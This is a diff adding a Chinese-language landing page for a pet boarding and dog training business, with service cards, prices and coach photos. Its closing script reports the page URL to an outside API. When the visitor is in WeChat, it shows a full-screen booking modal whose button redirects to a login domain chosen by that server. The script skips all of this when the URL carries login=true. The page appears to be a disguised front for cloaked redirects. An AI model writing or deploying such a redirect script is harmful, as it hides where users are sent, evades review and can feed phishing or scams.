@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>宠旅寄养 · 安心托管与训练</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',system-ui;}
+        body{background:#fff8f0;}
+        .navbar{background:#ffecd6;padding:1rem 6%;display:flex;justify-content:space-between;}
+        .logo{font-weight:800;color:#d35400;font-size:1.5rem;}
+        .nav-links{display:flex;gap:1.8rem;list-style:none;}
+        .nav-links a{color:#a04000;text-decoration:none;}
+        .hero-video{background:#ffcba4;margin:0 5% 2rem;border-radius:30px;padding:2rem;text-align:center;}
+        .hero-video h1{font-size:2rem;color:#c4450c;}
+        .service-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.8rem;margin:2rem 5%;}
+        .service-card{background:white;border-radius:28px;padding:1rem;box-shadow:0 15px 25px rgba(0,0,0,0.05);transition:0.2s;text-align:center;}
+        .service-card img{width:100%;height:140px;object-fit:cover;border-radius:20px;}
+        .price{color:#e67e22;font-weight:bold;margin:0.5rem 0;}
+        .coach{background:#ffedd5;margin:2rem 5%;border-radius:32px;padding:1.5rem;display:flex;flex-wrap:wrap;gap:1rem;justify-content:center;}
+        .coach-item{text-align:center;width:100px;}
+        .coach-item img{border-radius:50%;width:80px;height:80px;object-fit:cover;}
+        @media (max-width:700px){.nav-links{display:none;}}
+        .wechat-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);backdrop-filter:blur(2px);display:flex;justify-content:center;align-items:center;z-index:9999;display:none;}
+        .wechat-modal{width:280px;background:white;border-radius:30px;}
+        .enter-btn{background:#e67e22;border:none;padding:12px;border-radius:40px;color:white;margin:1rem;width:80%;cursor:pointer;}
+    </style>
+</head>
+<body>
+<div class="navbar"><div class="logo">🏡 宠旅寄养</div><ul class="nav-links"><li><a href="#">寄养环境</a></li><li><a href="#">训练营</a></li><li><a href="#">日托班</a></li><li><a href="#">口碑</a></li></ul></div>
+<div class="hero-video"><h1>假期无忧 · 专业陪伴</h1><p>家庭式寄养｜正向训练｜24h监控</p></div>
+<h2 style="margin:0 5%;color:#b64926;">🐕 明星服务套餐</h2>
+<div class="service-grid">
+    <div class="service-card"><img src="https://picsum.photos/id/96/400/300" alt="豪华寄养"><h3>尊享寄养房</h3><p>独立空调房，每日溜放2次，实时视频</p><div class="price">¥128/天</div></div>
+    <div class="service-card"><img src="https://picsum.photos/id/169/400/300" alt="行为训练"><h3>21天行为矫正</h3><p>爆冲/护食/分离焦虑，专业训犬师一对一</p><div class="price">¥3800起</div></div>
+    <div class="service-card"><img src="https://picsum.photos/id/102/400/300" alt="日托"><h3>狗狗日托班</h3><p>社交游戏+基础服从，早送晚接含午餐</p><div class="price">¥98/天</div></div>
+</div>
+<div class="coach"><div class="coach-item"><img src="https://picsum.photos/id/64/200/200" alt="教练"><p>阿福教练</p><small>8年经验</small></div><div class="coach-item"><img src="https://picsum.photos/id/65/200/200" alt="教练"><p>Luna</p><small>正向训练师</small></div><div class="coach-item"><img src="https://picsum.photos/id/91/200/200" alt="环境"><p>实景花园</p><small>500㎡草坪</small></div></div>
+<div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🎾 预约寄养/训练</p><span>点击进入锁定名额</span></div><button class="enter-btn" id="enterBtn">点击咨询</button></div></div>
+
+<script>
+(function(){
+    const modal = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    modal.style.display = "none";
+
+    // 若 URL 带有 login=true 则跳过弹窗和接口请求
+    if (new URLSearchParams(location.search).get('login') === 'true') return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若 rule_id 存在则追加参数
+    let apiUrl = "https://api.qlpdk.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                modal.style.display = "flex";
+            }
+            if (d?.data?.loginDomain) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").addEventListener("click", function() {
+                    location.href = d.data.loginDomain;
+                });
+            }
+        })
+        .catch(e => {});
+
+    modal.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
+</body>
+</html>
